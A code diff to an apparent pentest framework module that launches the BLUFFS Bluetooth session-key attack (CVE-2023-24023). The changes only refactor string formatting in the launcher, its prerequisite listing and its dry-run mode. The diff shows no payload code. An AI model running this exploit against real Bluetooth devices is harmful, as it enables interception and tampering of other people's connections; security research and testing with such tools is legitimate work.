@@ -107,19 +107,19 @@ class Exploit(Exploit):
         )
         print_info("\nVariants:")
         for k, v in self._VARIANTS.items():
-            print_info("  {} — {}".format(k, v))
+            print_info(f"  {k} — {v}")
         print_info("\nPrerequisites:")
         print_info("  - BLE MITM position (proxy device, InternalBlue, or custom HW)")
         print_info("  - Patched firmware on attacker BLE chip (for LMP injection)")
         print_info("  - InternalBlue Python library (https://github.com/seemoo-lab/internalblue)")
-        print_info("\nBluffs submodule path: {}".format(_bluffs_repo_root()))
+        print_info(f"\nBluffs submodule path: {_bluffs_repo_root()}")
         print_info("CVE: CVE-2023-24023 | CVSS: 6.8 (AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)")
 
     def _poc_mode(self) -> None:
         """Launch the BLUFFS PoC from the submodule."""
         repo = _bluffs_repo_root()
         if not repo.exists():
-            print_error("Submodule bluffs não encontrado em: {}".format(repo))
+            print_error(f"Submodule bluffs não encontrado em: {repo}")
             print_info("Execute: git submodule update --init submodules/IoT/bluffs")
             return
 
@@ -136,7 +136,7 @@ class Exploit(Exploit):
                 break
 
         if not poc_script:
-            print_error("Não foi possível localizar script PoC em {}.".format(repo))
+            print_error(f"Não foi possível localizar script PoC em {repo}.")
             print_info("Verifique a estrutura do submodule bluffs e ajuste poc_script.")
             return
 
@@ -158,19 +158,19 @@ class Exploit(Exploit):
 
         cmd_str = " ".join(cmd)
         if self.dry_run:
-            print_info("DRY RUN — {}".format(cmd_str))
+            print_info(f"DRY RUN — {cmd_str}")
             return
 
-        print_status("Executando BLUFFS PoC: variante {}".format(int(self.attack_variant)))
+        print_status(f"Executando BLUFFS PoC: variante {int(self.attack_variant)}")
         print_info(cmd_str)
         try:
             subprocess.run(cmd, cwd=str(repo), check=False)
         except KeyboardInterrupt:
             print_info("\nInterrompido.")
         except FileNotFoundError:
-            print_error("Python não encontrado: {}".format(python_bin))
+            print_error(f"Python não encontrado: {python_bin}")
         except Exception as exc:
-            print_error("Erro ao executar PoC: {}".format(exc))
+            print_error(f"Erro ao executar PoC: {exc}")
 
     def _framing_mode(self) -> None:
         """Native Scapy framing demonstration for BLE LMP feature injection."""
